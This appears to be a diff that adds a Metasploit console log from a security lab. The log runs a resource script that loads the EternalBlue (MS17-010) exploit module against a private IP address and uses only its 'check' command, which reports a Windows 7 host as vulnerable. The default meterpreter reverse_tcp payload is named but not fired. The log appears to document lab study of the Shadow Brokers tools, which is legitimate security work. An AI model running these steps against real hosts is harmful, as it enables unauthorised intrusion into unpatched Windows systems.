@@ -1,0 +1,32 @@
+
+chfay@kali:~/The Shadow Brokers$ msfconsole -q -r NEW/scripts/ms17_010_check.rc
+[*] Processing NEW/scripts/ms17_010_check.rc for ERB directives.
+resource (NEW/scripts/ms17_010_check.rc)> use exploit/windows/smb/ms17_010_eternalblue
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+resource (NEW/scripts/ms17_010_check.rc)> set RHOSTS 172.16.202.133
+RHOSTS => 172.16.202.133
+resource (NEW/scripts/ms17_010_check.rc)> set RPORT 445
+RPORT => 445
+resource (NEW/scripts/ms17_010_check.rc)> check
+[*] 172.16.202.133:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 172.16.202.133:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7600 x64 (64-bit)
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.37/lib/recog/fingerprint/regexp_factory.rb:34: warning
+: nested repeat operator '+' and '?' was replaced with '*' in regular expression
+[*] 172.16.202.133:445    - Scanned 1 of 1 hosts (100% complete)
+[+] 172.16.202.133:445 - The target is vulnerable.
+resource (NEW/scripts/ms17_010_check.rc)> exit
+
+chfay@kali:~/The Shadow Brokers$
+
+
+
+
+
+
+
+
+
+
+
+
+
